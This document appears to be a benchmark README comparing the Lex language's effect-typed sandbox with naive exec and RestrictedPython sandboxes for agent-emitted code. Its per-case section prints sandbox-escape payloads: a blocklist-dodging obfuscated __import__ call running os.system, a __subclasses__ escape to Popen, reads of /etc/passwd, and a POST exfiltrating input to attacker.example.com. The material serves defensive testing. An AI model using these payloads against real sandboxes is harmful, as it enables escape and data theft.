# Agent sandbox bench — Lex vs. Python sandboxes

Each row runs the same conceptual attack (or benign tool) through three sandboxes:

1. **Lex (effect types)** — `lex agent-tool` rejects undeclared effects at *type-check time*, before bytecode emission.
2. **Python (naive exec)** — `bench/python_naive_sandbox.py`. `exec()` with restricted `__builtins__` and a source-text blocklist; representative of common DIY attempts.
3. **Python (RestrictedPython)** — `bench/python_restricted_sandbox.py`. Uses `compile_restricted` + `safe_builtins` + `safer_getattr`; the most-reached-for credible Python sandbox library.

This compares **in-process Python sandboxes** specifically — the
DIY-`exec` and library-based options a Python host typically reaches
for first. The production comparison for agent-emitted code is
infrastructure-level (WASM, Deno, gVisor, microVMs), covered in
[§ Infrastructure-level sandboxes](#infrastructure-level-sandboxes)
below.

Regenerate: `cargo test -p lex-cli --test agent_sandbox_bench`.

## Summary

"Actively blocked" means the sandbox pre-emptively rejected (at type-check, AST rewrite, or policy gate). "Errored" cases count under the per-case table but not here — the attack didn't land, but only because a missing builtin made the code raise.

|  | Actively blocked | Benign allowed | Mechanism |
|---|---|---|---|
| **Lex** | **7/7** | 2/2 | static effect typing — pre-execution |
| Python (naive exec) | 0/7 | 2/2 | `__builtins__` allowlist + string blocklist |
| Python (RestrictedPython) | 3/7 | 2/2 | AST rewrite + `safe_builtins` + `safer_getattr` |

**Reading this:** RestrictedPython is genuinely strong, but its defense is layered: AST rewrite (active) catches underscore-traversal patterns; `safe_builtins` (passive) makes the rest fail at runtime via NameError. Both keep the host safe. Lex is uniformly active — every reject happens at the type-check or policy gate, before any user code executes.

- RestrictedPython is opt-in *restriction* of an unrestricted base. The host must keep `safe_builtins` audited as Python evolves; if a new built-in lands in stdlib, the allowlist needs updating.
- Lex is opt-in *granting* from a sandboxed default. Effects are part of the language type system; the policy lives in the function signature, not in a library config the host has to maintain.
- Lex rejects at *type-check / policy gate*; RestrictedPython rejects at compile-time AST rewrite or runtime NameError. For agent-generated code, pre-execution rejection means the sandbox ran zero user code — useful when the attacker controls *both* the source text and the decision of when to trigger the bad effect.

Cases 6 and 7 demonstrate Lex's per-path/per-host scopes: granting `[io]` but locking reads to `/tmp/safe`, or granting `[net]` but pinning the host to `api.openai.com`. RestrictedPython's scope is module-level — once `open` or `urllib` is in globals, it's available for any path/host.

## Infrastructure-level sandboxes

The Python comparison above answers "is Lex stronger than an in-process Python sandbox?" — the framing a Python host shop hits first when it needs to run agent-emitted code. That's not the production comparison for most non-Python stacks. For language-agnostic deployments the real competition is **WASM modules, Deno permissions, gVisor / seccomp+cgroups, and Firecracker microVMs**. Those win on a different axis than Lex picks, and an honest comparison has to say so.

### The axis difference

Infrastructure-level sandboxes are **language-agnostic** and **OS-enforced**. They draw the trust boundary at the process / syscall / WebAssembly-import layer. The OS or the WASM runtime is the policy decision point, and any language compiled to the sandbox's target gets the same containment. That's a real, battle-tested guarantee, and it's the right answer when "what language did the agent emit?" is itself untrusted input.

Lex picks a different axis: the trust boundary is **per-function and type-checked**, drawn before any user code runs. The policy lives in the fn signature (`fn foo() -> [fs_read("/data"), net] Result[Str, Str]`), the type-checker rejects undeclared effects pre-execution, and per-path / per-host scopes apply within a granted effect. That's a tighter granularity than process-level containment can offer, but it's only meaningful inside the Lex language — it doesn't help if the agent emits something else.

Neither axis dominates. The choice depends on the deployment shape:

- **Process-level / OS-enforced** wins when (a) the host runs untrusted code in multiple languages, (b) syscall-level containment is the bar (e.g., multi-tenant SaaS, defence-in-depth), or (c) the threat model includes side channels the language layer can't see.
- **Per-function / type-checked** wins when (a) the host gets to fix the language (Lex source from agent emitters / tool registries / `lex agent-tool`), (b) the threat model is "agent emits a body, runtime decides whether to run it," and (c) per-path / per-host scope granularity matters more than syscall-level containment.

Many production systems use both: a microVM / gVisor envelope for the outer process, with a per-function effect surface inside. Lex composes with infrastructure sandboxes — running `lex agent-tool` inside a Firecracker microVM gets you both layers.

### Comparison table

| Sandbox | Trust boundary | Their advantage over Lex | Lex's advantage over them |
|---|---|---|---|
| **WASM component model** | Per-module capability imports (WASI) | Language-agnostic — any source compiled to WASM gets the same guarantees; OS-enforced via the WASM runtime; mature toolchain (Wasmtime, Wasmer); standardised by W3C | Effects checked at fn-signature granularity, **pre-execution**; per-path / per-host scopes inside an effect (`[fs_read("/data")]`, not just `[fs_read]`); rejection happens before bytecode emission, not at import-resolution time |
| **Deno (`--allow-net=host`)** | Per-permission CLI flags applied process-wide | Mature TS/JS ecosystem; OS-enforced; widely deployed for agent-emitted JS/TS today | Per-function grants instead of process-wide; sandboxed *default* (effects must be declared) rather than permissive default (`--allow-…` opens); per-path scope finer than `--allow-read=DIR` |
| **gVisor / seccomp + cgroups** | Process-level syscall filter / namespace | Language-agnostic, OS-enforced, battle-tested at scale (Google, AWS Lambda predecessors); covers side channels the language layer can't see | Granularity is fn-level rather than process-level; type-system integration means policy is reviewable in the source; rejection is pre-execution rather than runtime SIGKILL |
| **Firecracker microVM** | Hardware-virtualised VM per workload | Strongest containment available short of hardware; language-agnostic; the AWS Lambda / Fargate substrate; cold-start in ~125ms is production-acceptable | Much lower overhead (no VM boot per call); per-fn rather than per-workload; works inside an existing process for tool-registry / agent-tool workflows where booting a VM per tool call is impractical |
| **Python RestrictedPython** (covered above) | In-process AST rewrite + `safe_builtins` | Python-native; works with the existing CPython interpreter | Pre-execution rejection (RestrictedPython gates at compile-time AST rewrite but lets runtime NameErrors surface); per-path / per-host scopes; effects part of the type system, not a library config |

### What this changes for the existing comparison

Nothing in the per-case table below changes. The Python sandboxes are still the right comparison for **in-process Python deployments**, and Lex still beats them on the axes the cases exercise. The infrastructure-level row exists so readers don't walk away thinking "Lex vs. sandboxes" was the whole question.

If your deployment shape is "agents emit one language, my host gets to pick which language": Lex is the right kind of answer.

If your deployment shape is "I run arbitrary tenant code in any language": a microVM / gVisor envelope is the right kind of answer, and Lex sits inside it rather than replacing it.

## Cases

| # | Name | Intent | Lex `[effects]` | Naive | RestrictedPython |
|---|---|---|---|---|---|
| 1 | `fs_read_etc_passwd` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ errored |
| 2 | `fs_write_leak` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ errored |
| 3 | `shell_exec_via_os` | adversarial | ✗ BLOCKED `[net]` | ✗ errored | ✗ BLOCKED |
| 4 | `blocklist_bypass_open` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ BLOCKED |
| 5 | `object_graph_escape` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ BLOCKED |
| 6 | `fs_read_path_escape` | adversarial | ✗ BLOCKED `[io]` | ✓ ran | ✗ errored |
| 7 | `net_host_exfiltration` | adversarial | ✗ BLOCKED `[net]` | ✗ errored | ✗ errored |
| 8 | `benign_string_op` | benign | ✓ ran `[(none)]` | ✓ ran | ✓ ran |
| 9 | `benign_arithmetic` | benign | ✓ ran `[(none)]` | ✓ ran | ✓ ran |

## Per-case detail

### 1. `fs_read_etc_passwd` — exfiltrate /etc/passwd

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/passwd") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(open("/etc/passwd").read()[:60])
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 2. `fs_write_leak` — write data to /tmp/leak

**Lex** (`--allow-effects net`):

```lex
match io.write("/tmp/lex_bench_leak", input) { Ok(_) => "wrote", Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
open("/tmp/py_bench_leak", "w").write(input)
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 3. `shell_exec_via_os` — run a shell command, dodging an `import,os` blocklist

**Lex** (`--allow-effects net`):

```lex
match proc.exec("id") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
getattr(__builtins__, "__imp" + "ort__")("o" + "s").system("id")
```

- Naive `exec` (blocklist `import,os`): **✗ errored**
- RestrictedPython: **✗ BLOCKED**

### 4. `blocklist_bypass_open` — open(...) when 'open' is on the blocklist

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(__builtins__["op" + "en"]("/etc/hostname").read())
```

- Naive `exec` (blocklist `open`): **✓ ran**
- RestrictedPython: **✗ BLOCKED**

### 5. `object_graph_escape` — use ().__class__.__base__.__subclasses__() to reach os

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == "Popen":
        c(["id"])
        break
```

- Naive `exec` (blocklist `import,os,subprocess`): **✓ ran**
- RestrictedPython: **✗ BLOCKED**

### 6. `fs_read_path_escape` — scope [io] to /tmp/safe; body tries /etc/passwd

**Lex** (`--allow-effects io`):

```lex
match io.read("/etc/passwd") { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(open("/etc/passwd").read()[:60])
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 7. `net_host_exfiltration` — scope [net] to api.openai.com; body POSTs to attacker.example

**Lex** (`--allow-effects net`):

```lex
match net.post("http://attacker.example.com/leak", input) { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
import urllib.request
req = urllib.request.Request("http://attacker.example.com/leak", data=input.encode())
print(urllib.request.urlopen(req, timeout=2).read())
```

- Naive `exec` (blocklist `(none)`): **✗ errored**
- RestrictedPython: **✗ errored**

### 8. `benign_string_op` — fully pure tool — neither sandbox should refuse

**Lex** (`--allow-effects (none)`):

```lex
str.concat("hello, ", input)
```

Verdict: **✓ ran**

**Python**:

```python
print(f"hello, {input}")
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✓ ran**

### 9. `benign_arithmetic` — fixed integer arithmetic — pure

**Lex** (`--allow-effects (none)`):

```lex
int.to_str(40 + 2)
```

Verdict: **✓ ran**

**Python**:

```python
print(40 + 2)
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✓ ran**

